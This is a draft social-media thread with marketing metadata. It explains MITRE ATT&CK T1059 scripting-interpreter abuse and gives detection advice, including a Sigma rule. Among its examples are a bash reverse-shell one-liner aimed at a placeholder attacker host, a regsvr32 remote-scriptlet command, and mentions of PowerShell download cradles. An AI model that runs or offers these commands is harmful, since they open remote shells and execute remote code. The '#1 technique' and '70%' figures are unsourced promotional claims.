---
slug: mofu-02-mitre-attck-t1059
title: T1059, The #1 Attack Technique Your SIEM Is Missing
funnel: mofu
platform: twitter
format: thread
hook: how-to
persona: Mid-Level Detection Engineer
hashtags: MITRE, ATTCK, detection, threatintel, YARA
cta: Follow for one detection technique every week
notes: Technical deep-dive thread. Each tweet is one aspect of T1059. Mixes education with actionable detection guidance. The detection rule tweets get the most saves.
---

T1059: Command and Scripting Interpreter.

It's the #1 technique in real-world attacks.

Here's how to detect what your SIEM is probably missing. 🧵

---

What is T1059?

Attackers use built-in scripting tools (PowerShell, Python, Bash, JavaScript) to execute malicious code.

No malware needed. No files dropped. Living off the land.

---

Why it's dangerous:

- Runs in trusted processes (powershell.exe, python.exe)
- Often passes signature-based detection
- Executes in memory (no disk artifacts)
- 70% of APT groups use it (MITRE data)
- Your EDR sees a "normal" process. Your SIEM sees nothing.

---

PowerShell, the #1 offender:

- -EncodedCommand (base64 obfuscated payloads)
- -ExecutionPolicy Bypass
- Download cradles (IEX, Net.WebClient)
- AMSI bypass attempts

If you're not monitoring PowerShell script blocks, you're blind.

---

Detection rule (Sigma):

title: Encoded PowerShell Command
detection:
  selection:
    EventID: 4104
    ScriptBlockText|contains: '-EncodedCommand'
  condition: selection
level: high

Copy this. Deploy it today.

---

Python/Bash, the Linux blind spot:

- Most SIEMs focus on Windows
- python -c 'import os; os.system("...")'
- bash -i >& /dev/tcp/attacker/4444 0>&1
- Cron job persistence via scripting

Linux is the new frontier. Are you monitoring it?

---

JavaScript, the fileless threat:

- wscript.exe / cscript.exe execution
- mshta.exe loading remote HTA files
- Node.js spawning child processes
- LOLBAS: regsvr32 /s /n /u /i:URL scrobj.dll

Fileless doesn't mean undetectable. It means you need better rules.

---

5 detection rules to write today:

1. PowerShell encoded command execution
2. Python/bash spawning network connections
3. WScript/CScript with remote URLs
4. MSHTA loading external content
5. Script interpreter → credential access tool

---

The key insight:

Don't detect the script, detect the BEHAVIOR.

A PowerShell download cradle is suspicious. PowerShell itself is not. Context is everything.

---

CTA: Follow @pranithjain for weekly detection engineering threads.

#MITRE #ATTCK #detection #threatintel #YARA
